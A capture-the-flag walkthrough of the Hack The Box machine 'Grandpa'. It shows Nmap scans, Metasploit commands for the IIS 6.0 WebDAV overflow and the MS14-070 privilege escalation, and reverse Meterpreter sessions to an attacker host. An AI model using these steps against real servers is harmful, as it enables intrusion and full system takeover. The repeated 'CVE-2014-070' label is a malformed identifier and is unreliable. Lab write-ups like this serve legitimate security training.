# Grandpa

> A Windows-based Hack The Box machine focused on exploiting a vulnerable Microsoft IIS 6.0 WebDAV service and escalating privileges to `SYSTEM`.

## Overview

| Category                 | Details                                                |
| ------------------------ | ------------------------------------------------------ |
| **Machine**              | Grandpa                                                |
| **Platform**             | Windows                                                |
| **Target IP**            | `10.129.95.233`                                        |
| **Initial Service**      | Microsoft IIS 6.0                                      |
| **Initial Access**       | CVE-2017-7269 — IIS 6.0 WebDAV buffer overflow         |
| **Privilege Escalation** | CVE-2014-070 — TCP/IP IOCTL local privilege escalation |
| **Final Access**         | `NT AUTHORITY\SYSTEM`                                  |

The attack path was:

```text
Nmap Enumeration
        ↓
Microsoft IIS 6.0 Discovery
        ↓
WebDAV Enumeration
        ↓
CVE-2017-7269
        ↓
Meterpreter Session
        ↓
NETWORK SERVICE
        ↓
Process Migration
        ↓
CVE-2014-070 TCP/IP IOCTL
        ↓
NT AUTHORITY\SYSTEM
        ↓
User / Root Flags
```

---

## Enumeration

### Nmap Scan

We start with a basic Nmap scan against the target:

```bash
nmap 10.129.95.233
```

The initial scan showed only one open TCP port:

```text
Nmap scan report for 10.129.95.233
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2026-09-04 10:42:35 EDT for 16s
Not shown: 999 filtered tcp ports (no-response)

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

Only **port 80/TCP** was accessible, running HTTP.

While the full-port scan continued in the background, we performed service and version detection.

### Service Version Detection

```bash
nmap -sC -sV 10.129.95.233
```

The scan identified Microsoft IIS 6.0:

```text
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Fri, 04 Sep 2026 14:43:30 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Interesting Findings

The scan revealed several important points:

| Port | Service | Information                      |
| ---- | ------- | -------------------------------- |
| `80` | HTTP    | Microsoft IIS 6.0                |
| `80` | WebDAV  | Multiple WebDAV methods enabled  |
| `80` | HTTP    | Page title: `Under Construction` |

The WebDAV configuration was particularly interesting because IIS 6.0 has known vulnerabilities associated with its WebDAV implementation.

---

## Initial Foothold

### CVE-2017-7269

After identifying **Microsoft IIS 6.0**, we searched for known vulnerabilities affecting this version.

The search led to **CVE-2017-7269**, a critical remote code execution vulnerability in IIS 6.0's WebDAV functionality caused by a buffer overflow.

We searched for the vulnerability in Metasploit:

```text
search CVE-2017-7269
```

Metasploit returned:

```text
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```

We selected the available exploit:

```text
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

The attacker machine was configured with:

```text
LHOST => 10.10.15.95
```

The target was configured as:

```text
set RHOST 10.129.95.233
```

We then executed the exploit:

```text
run
```

The exploit succeeded:

```text
[*] Started reverse TCP handler on 10.10.15.95:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (190534 bytes) to 10.129.95.233
[*] Meterpreter session 1 opened (10.10.15.95:4444 -> 10.129.95.233:1030) at 2026-09-04 10:50:50 -0400

(Meterpreter 1)(c:\windows\system32\inetsrv) >
```

We now had a **Meterpreter session** on the target.

---

## User Access

The initial Meterpreter session was not running with the privileges required for the next stage, so we began investigating possible local privilege escalation options.

### Local Exploit Suggester

We backgrounded the Meterpreter session and used Metasploit's local exploit suggester:

```text
set SESSION 1
run
```

The module identified several possible local exploits:

```text
[+] 10.129.95.233 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.95.233 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.95.233 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.95.233 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

We first attempted:

```text
exploit/windows/local/ms10_015_kitrap0d
```

However, the exploit failed:

```text
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```

So we moved on to another identified vulnerability.

---

## Privilege Escalation

### Process Enumeration

Before attempting the privilege escalation, we examined running processes using Meterpreter's `ps` command.

Among the processes identified were:

```text
404   344   lsass.exe
952   392   spoolsv.exe
1876  584   wmiprvse.exe       x86   0   NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
```

We attempted to migrate into `lsass.exe`:

```text
migrate 404
```

This failed because the current session did not have sufficient privileges:

```text
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

We then attempted to migrate into `spoolsv.exe`:

```text
migrate 952
```

This also failed:

```text
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

There were processes running as `NETWORK SERVICE`, so we attempted to migrate into `wmiprvse.exe`:

```text
migrate 1876
```

This migration succeeded:

```text
[*] Migration completed successfully.
(Meterpreter 1)(C:\WINDOWS\system32) >
```

We verified the current user:

```text
getuid
```

Output:

```text
Server username: NT AUTHORITY\NETWORK SERVICE
```

The session was now running as:

```text
NT AUTHORITY\NETWORK SERVICE
```

---

### CVE-2014-070 — TCP/IP IOCTL

The local exploit suggester had identified the following vulnerability:

```text
exploit/windows/local/ms14_070_tcpip_ioctl
```

We used this exploit against the migrated session.

The exploit was executed with the session configured appropriately:

```text
run
```

Metasploit reported:

```text
[*] Started reverse TCP handler on 10.10.15.95:5555
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (190534 bytes) to 10.129.95.233
[*] Meterpreter session 2 opened (10.10.15.95:5555 -> 10.129.95.233:1031) at 2026-09-04 11:15:04 -0400
```

We then checked the identity of the new session:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

The privilege escalation was successful, giving us **SYSTEM-level access**.

---

## Root Access

With the second Meterpreter session running as `NT AUTHORITY\SYSTEM`, we navigated to the user's Desktop and retrieved the user flag:

```text
(Meterpreter 2)(C:\Documents and Settings\Harry\Desktop) > cat user.txt
```

The `user.txt` file was successfully accessed.

We then moved to the Administrator Desktop:

```text
cd Desktop\\
```

The session was now located at:

```text
C:\Documents and Settings\Administrator\Desktop
```

We retrieved the root flag:

```text
cat root.txt
```

The `root.txt` file was successfully accessed.

> Flag values are omitted because the raw notes did not provide their actual contents.

---

## Attack Path Summary

```text
Nmap Scan
    ↓
Port 80 discovered
    ↓
Microsoft IIS 6.0 identified
    ↓
WebDAV methods identified
    ↓
CVE-2017-7269 identified
    ↓
IIS WebDAV buffer overflow exploited
    ↓
Meterpreter Session 1
    ↓
Process migration to wmiprvse.exe
    ↓
NETWORK SERVICE
    ↓
Local Exploit Suggester
    ↓
CVE-2014-070 identified
    ↓
TCP/IP IOCTL exploit
    ↓
Meterpreter Session 2
    ↓
NT AUTHORITY\SYSTEM
    ↓
user.txt
    ↓
root.txt
```

---

## Key Takeaways

1. **Service version enumeration is important.** Identifying Microsoft IIS 6.0 immediately provided a strong direction for vulnerability research.

2. **WebDAV can significantly expand the attack surface.** The Nmap scan revealed numerous enabled WebDAV methods on the IIS server.

3. **Legacy software can contain serious vulnerabilities.** IIS 6.0 was vulnerable to the WebDAV buffer overflow used for initial access.

4. **Process migration can help with post-exploitation.** The initial session could not migrate into privileged processes, but successfully migrating into `wmiprvse.exe` provided a usable `NETWORK SERVICE` context.

5. **Local exploit enumeration is useful after obtaining a foothold.** The Metasploit local exploit suggester identified multiple possible privilege escalation paths.

6. **Not every suggested exploit will work.** The `ms10_015_kitrap0d` attempt failed, requiring another identified vulnerability to be tested.

7. **Privilege escalation should always be verified.** Running `getuid` after exploitation confirmed that the session had successfully reached `NT AUTHORITY\SYSTEM`.

---

## Tools Used

* **Nmap** — Port, service, version, HTTP method, and WebDAV enumeration
* **Burp Suite** — Web application inspection
* **Web Browser** — Initial HTTP inspection
* **Metasploit Framework** — Exploitation and local privilege escalation
* **Meterpreter** — Post-exploitation, process enumeration, migration, and flag retrieval

---

## Conclusion

Grandpa demonstrated a straightforward but important Windows exploitation chain: enumerate the exposed services, identify the legacy IIS 6.0 WebDAV service, exploit the known WebDAV vulnerability to obtain a Meterpreter session, and then perform local privilege escalation.

The initial `NETWORK SERVICE` context was not sufficient for SYSTEM access, but process migration followed by exploitation of the vulnerable TCP/IP functionality ultimately resulted in `NT AUTHORITY\SYSTEM`.

The main lesson from the machine is the importance of **accurate service enumeration, vulnerability identification, post-exploitation enumeration, and systematic privilege escalation** when working with legacy Windows systems.
